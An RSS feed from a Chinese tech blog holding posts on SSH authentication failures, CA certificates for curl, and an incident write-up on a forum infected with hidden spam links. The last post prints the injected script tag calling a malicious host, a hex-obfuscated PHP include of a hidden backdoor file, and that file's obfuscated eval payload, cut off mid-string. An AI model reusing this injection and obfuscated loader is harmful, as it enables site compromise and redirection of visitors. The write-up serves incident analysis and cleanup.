<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>security - 看看俺 – KanKanAn.com</title>
        <description>记我所思，忆我所为。</description>
        <link>http://blog.kankanan.com/tag/security.xml</link>
        <lastBuildDate>Mon, 26 Dec 2016 10:22:26 GMT</lastBuildDate>
        <docs>http://blogs.law.harvard.edu/tech/rss</docs>
        <image>
            <title>security - 看看俺 – KanKanAn.com</title>
            <url>http://blog.kankanan.com/static/favicon.ico</url>
            <link>http://blog.kankanan.com/tag/security.xml</link>
        </image>
        <copyright>版权所有 © 2011-2015 看看俺 – KanKanAn.com</copyright>
        <generator>Feed for Node.js</generator>
        <category>技术</category>
        <item>
            <title><![CDATA[解决 ssh 登录总是提示认证失败次数过多的问题]]></title>
            <link>/article/89e351b3-ssh-767b5f55603b662f63d0793a8ba48bc159318d256b2165708fc7591a768495ee9898.html</link>
            <guid>/article/89e351b3-ssh-767b5f55603b662f63d0793a8ba48bc159318d256b2165708fc7591a768495ee9898.html</guid>
            <pubDate>Sun, 24 Apr 2016 09:08:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
服务器需要 vpn 才能进行 ssh 访问，但是周末在家突然 ssh 登录不上了，如下所示：
</p>
<pre class="example">
$ ssh tangxinfa@xxxx.xxxxxx.xxx
Received disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa
Connection to xxxx.xxxxxx.xxx closed by remote host.
Connection to xxxx.xxxxxx.xxx closed.
</pre>

<p>
找运维人员咨询，说有可能是 openvpn 运行后设置的路由有问题，ssh 登录没有走 vpn ，建议重建 vpn 连接或重启机器。
但是重启机器后还是一样，在 windows 下使用 openvpn ，通过 pietty 却可以正常 ssh 登录上服务器。
</p>

<p>
网上搜索了一下，找到一个有关的帖子
</p>
<blockquote>
<p>
This is usually caused by inadvertently offering multiple ssh keys to the server. The server will reject any key after too many keys have been offered.
</p>

<p>
You can see this for yourself by adding the -v flag to your ssh command to get verbose output. You will see that a bunch of keys are offered, until the server rejects the connection saying: "Too many authentication failures for [user]". Without verbose mode, you will only see the ambiguous message "Connection reset by peer".
</p>

<p>
To prevent irrelevant keys from being offered, you have to explicitly specify this in every host entry in the ~/.ssh/config file by adding IdentitiesOnly like so:
</p>

<p>
Host www.somehost.com
    IdentityFile ~/.ssh/key_for_somehost_rsa
    IdentitiesOnly yes
    Port 22
</p>
</blockquote>
<p>
引用自《<a href="http://superuser.com/questions/187779/too-many-authentication-failures-for-username">ssh - Too many authentication failures for <b>username</b> - Super User</a>》
</p>

<p>
也就是说，ssh 登录时会使用系统上的公匙依次进行认证，如果公私匙对数量超过服务器登录失败次数限制，就会出现上面提到的问题。
</p>

<p>
为了登录 github 及内部的 gitlab，我创建了不同的 rsa 公私匙对，算上系统默认的公私匙对，达到三对
</p>
<pre class="example">
$ tree ~/.ssh
/home/tangxinfa/.ssh
├── github_id_rsa
├── github_id_rsa.pub
├── id_rsa
├── id_rsa.pub
├── known_hosts
├── gitlab_id_rsa
└── gitlab_id_rsa.pub

0 directories, 7 files
</pre>

<p>
当我们使用 ssh 登录服务器时，默认情况下会尝试使用公钥依次进行身份验证，如果还是失败则会使用密码进行登录
</p>
<pre class="example">
$ ssh -v tangxinfa@xxxx.xxxxxx.xxx
...
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Offering RSA public key: /home/tangxinfa/.ssh/id_rsa
debug1: Authentications that can continue: publickey,password
debug1: Offering RSA public key: github
debug1: Authentications that can continue: publickey,password
debug1: Offering RSA public key: gitlab
Received disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa
debug1: Authentication succeeded (publickey).
Authenticated to xxxx.xxxxxx.xxx ([xxx.xxx.xxx.xxx]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: channel 0: free: client-session, nchannels 1
Connection to xxxx.xxxxxx.xxx closed by remote host.
Connection to xxxx.xxxxxx.xxx closed.
Transferred: sent 3328, received 2776 bytes, in 0.1 seconds
Bytes per second: sent 59495.7, received 49627.4
debug1: Exit status -1
</pre>

<p>
知道了问题的原因，解决方法就很多了，如：
</p>

<ul class="org-ul">
<li>调整 ssh 服务配置，调高失败次数限制
</li>

<li>调整 ssh 客户端配置，不使用公钥认证

<p>
可以在命令行选项中指定
</p>
<div class="org-src-container">

<pre class="src src-sh">ssh -o <span style="color: #f0c674;">PreferredAuthentications</span>=password tangxinfa@xxxx.xxxxxx.xxx
</pre>
</div>

<p>
也可以配置文件中指定
<code>~/.ssh/config</code>
</p>
<pre class="example">
Host xxxx xxxx.xxxxxx.xxx
     HostName xxxx.xxxxxx.xxx
     User tangxinfa
     PreferredAuthentications password
</pre>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[修复 SSL certificate problem: unable to get local issuer certificate]]></title>
            <link>/article/4fee590d-ssl-certificate-problem-unable-to-get-local-issuer-certificate.html</link>
            <guid>/article/4fee590d-ssl-certificate-problem-unable-to-get-local-issuer-certificate.html</guid>
            <pubDate>Mon, 14 Mar 2016 12:36:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在嵌入式 linux 设备上使用 curl 访问 https 站点会报错：
</p>
<pre class="example">
# curl https://www.google.com
curl: (60) SSL certificate problem: unable to get local issuer certificate
More details here: http://curl.haxx.se/docs/sslcerts.html

curl performs SSL certificate verification by default, using a "bundle"
 of Certificate Authority (CA) public keys (CA certs). If the default
 bundle file isn't adequate, you can specify an alternate file
 using the --cacert option.
If this HTTPS server uses a certificate signed by a CA represented in
 the bundle, the certificate verification probably failed due to a
 problem with the certificate (it might be expired, or the name might
 not match the domain name in the URL).
If you'd like to turn off curl's verification of the certificate, use
 the -k (or --insecure) option.
</pre>

<p>
而 linux 桌面上使用 curl 访问 https 站点则正常：
</p>
<pre class="example">
$ curl https://www.google.com
&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;
&lt;H1&gt;302 Moved&lt;/H1&gt;
The document has moved
&lt;A HREF="https://www.google.com.hk/?gfe_rd=cr&amp;amp;ei=i2DmVtXLDOzN8geg-afACA"&gt;here&lt;/A&gt;.
&lt;/BODY&gt;&lt;/HTML&gt;
</pre>

<p>
嵌入式 linux 设备上缺少了 CA 证书。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">什么是 CA 证书</h2>
<div class="outline-text-2" id="text-1">
<blockquote>
<p>
Certificate Authority (CA) Certificates
</p>

<p>
A certificate authority (CA) is a trusted entity that issues electronic documents that verify a digital entity’s identity on the Internet. The electronic documents, which are called digital certificates, are an essential part of secure communication and play an important part in the public key infrastructure (PKI). Certificates typically include the owner's public key, the expiration date of the certificate, the owner's name and other information about the public key owner.
</p>
</blockquote>
<p>
引用自 <a href="http://searchsecurity.techtarget.com/definition/certificate-authority">What is certificate authority (CA)? - Definition from WhatIs.com</a>
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">获取 CA 证书</h2>
<div class="outline-text-2" id="text-2">
<p>
比较有名的 CA 证书列表由 mozilla 维护，<a href="https://curl.haxx.se/">curl</a> 提供了命令行工具 <a href="https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl">mk-ca-bundle.pl</a> ，用于下载 mozilla 维护的 CA 证书列表，转换成 SSL 应用程序可直接使用的格式。
</p>

<p>
linux 系统的 CA 证书由操作系统发行版负责维护，没有统一的标准规定如何维护和管理 CA 证书。
</p>

<p>
Archlinux 的 CA 证书由 <a href="https://www.archlinux.org/packages/core/any/ca-certificates/">ca-certificates</a> 包维护，CA 证书来自依赖的包 <a href="https://www.archlinux.org/packages/core/i686/ca-certificates-mozilla/">ca-certificates-mozilla</a> 及 <a href="https://www.archlinux.org/packages/core/any/ca-certificates-cacert/">ca-certificates-cacert</a> 。
</p>
<pre class="example">
$ pacman -Qi ca-certificates
Name            : ca-certificates
Version         : 20150402-1
Description     : Common CA certificates (default providers)
Architecture    : any
URL             : http://pkgs.fedoraproject.org/cgit/ca-certificates.git
Licenses        : GPL2
Groups          : None
Provides        : None
Depends On      : ca-certificates-mozilla  ca-certificates-cacert
Optional Deps   : None
Required By     : curl  glib-networking  mono  neon  perl-lwp-protocol-https  qt4
Optional For    : lib32-openssl  openssl  wget
Conflicts With  : None
Replaces        : None
Installed Size  : 1024.00 B
Packager        : Jan Alexander Steffens (heftig) &lt;jan.steffens@gmail.com&gt;
Build Date      : 2015年04月03日 星期五 04时36分52秒
Install Date    : 2015年04月13日 星期一 16时04分37秒
Install Reason  : Installed as a dependency for another package
Install Script  : No
Validated By    : Signature
$ pacman -Ql ca-certificates
$ pacman -Ql ca-certificates-cacert
ca-certificates-cacert /usr/
ca-certificates-cacert /usr/share/
ca-certificates-cacert /usr/share/ca-certificates/
ca-certificates-cacert /usr/share/ca-certificates/trust-source/
ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/
ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_class3.crt
ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_root.crt
ca-certificates-cacert /usr/share/licenses/
ca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/
ca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/LICENSE
$ pacman -Ql ca-certificates-mozilla
ca-certificates-mozilla /usr/
ca-certificates-mozilla /usr/share/
ca-certificates-mozilla /usr/share/ca-certificates/
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.neutral-trust.crt
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.supplement.p11-kit
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.trust.crt
</pre>

<p>
拷贝 Archlinux 的 CA 证书文件 /etc/ssl/certs/ca-certificates.crt 到嵌入式 linux 设备，
curl 编译时需要通过 <code>--with-ca-bundle</code> 指定默认的 CA 证书文件，运行时通过 <code>--cacert</code> 选项指定
</p>
<pre class="example">
# curl https://www.google.com --cacert /etc/ssl/certs/ca-certificates.crt
&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;
&lt;H1&gt;302 Moved&lt;/H1&gt;
The document has moved
&lt;A HREF="https://www.google.com.hk/?gfe_rd=cr&amp;amp;ei=LoDmVuXlB9TC8gecrZv4DA"&gt;here&lt;/A&gt;.
&lt;/BODY&gt;&lt;/HTML&gt;
</pre>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">更新 CA 证书</h2>
<div class="outline-text-2" id="text-3">
</div><div id="outline-container-sec-3-1" class="outline-3">
<h3 id="sec-3-1">使用 openwrt 的嵌入式设备</h3>
<div class="outline-text-3" id="text-3-1">
<p>
可以通过 opkg 进行安装和更新 CA 证书文件
</p>

<div class="org-src-container">

<pre class="src src-sh">opkg install ca-certificates
opkg upgrade ca-certificates
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3-2" class="outline-3">
<h3 id="sec-3-2">使用 linux 的嵌入式设备</h3>
<div class="outline-text-3" id="text-3-2">
<p>
如果没有软件包管理器，可以从 linux 服务器上定时下载最新的 CA 证书文件。
</p>

<p>
linux 服务器上的 CA 证书文件可以通过两种方式更新
</p>

<ul class="org-ul">
<li>更新 ca-certificates 软件包

<p>
CentOS 6.4
</p>
<div class="org-src-container">

<pre class="src src-sh">yum update ca-certificates
</pre>
</div>

<p>
CentOS 6.4 的 CA 证书文件 /etc/pki/tls/certs/ca-bundle.crt
</p>
</li>

<li><a href="https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl">mk-ca-bundle.pl</a> 脚本生成最新的 CA 证书文件

<p>
该脚本生成的 CA 证书文件包含 mozilla 维护的证书
</p>

<div class="org-src-container">

<pre class="src src-sh">mk-ca-bundle.pl -q ca-bundle.crt
</pre>
</div>
</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">参考</h2>
<div class="outline-text-2" id="text-4">
<ul class="org-ul">
<li><a href="https://en.wikipedia.org/wiki/Root_certificate">Root certificate - Wikipedia, the free encyclopedia</a>
</li>

<li><a href="https://curl.haxx.se/docs/sslcerts.html">cURL - SSL CA Certificates</a>
</li>

<li><a href="https://gist.github.com/jjb/996292">How to securely acquire the Mozilla root certificate bundle for use with curl, Net::HTTP, etc.</a>
</li>

<li><a href="https://curl.haxx.se/docs/mk-ca-bundle.html">mk-ca-bundle</a>
</li>

<li><a href="https://wiki.openwrt.org/doc/howto/wget-ssl-certs">SSL and Certificates in wget - OpenWrt Wiki</a>
</li>

<li><a href="https://www.happyassassin.net/2015/01/12/a-note-about-ssltls-trusted-certificate-stores-and-platforms/">A note about SSL/TLS trusted certificate stores, and platforms (OpenSSL and GnuTLS)</a>
</li>

<li><a href="http://searchsecurity.techtarget.com/definition/certificate-authority">What is certificate authority (CA)? - Definition from WhatIs.com</a>
</li>

<li><a href="https://projects.archlinux.org/svntogit/packages.git/tree/trunk/PKGBUILD?h=packages/curl">PKGBUILD of curl on Archlinux</a>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[论坛被挂暗链问题分析与解决]]></title>
            <link>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</link>
            <guid>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</guid>
            <pubDate>Tue, 01 Apr 2014 13:38:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #de935f;">div</span> <span style="color: #f0c674;">style</span>='display:none'&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">language</span>='javascript' <span style="color: #f0c674;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #f0c674;">&amp;logo</span>=1' <span style="color: #f0c674;">charset</span>='gb2312'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;&lt;/<span style="color: #de935f;">div</span>&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>='text/javascript' <span style="color: #f0c674;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #81a2be;">INCLUDE</span>(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #8abeb7;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">O00OO0</span>=urldecode(<span style="color: #8abeb7;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #8abeb7; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{3}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{6}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{33}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{33}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{10}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{10}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{0}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{18}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{3}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{0}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{1}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{7}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{13};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{22}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{36}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{29}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{26}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{32}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{35}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{26}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30};</span><span style="color: #b5bd68; text-decoration: underline;">eval</span><span style="text-decoration: underline;">(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNh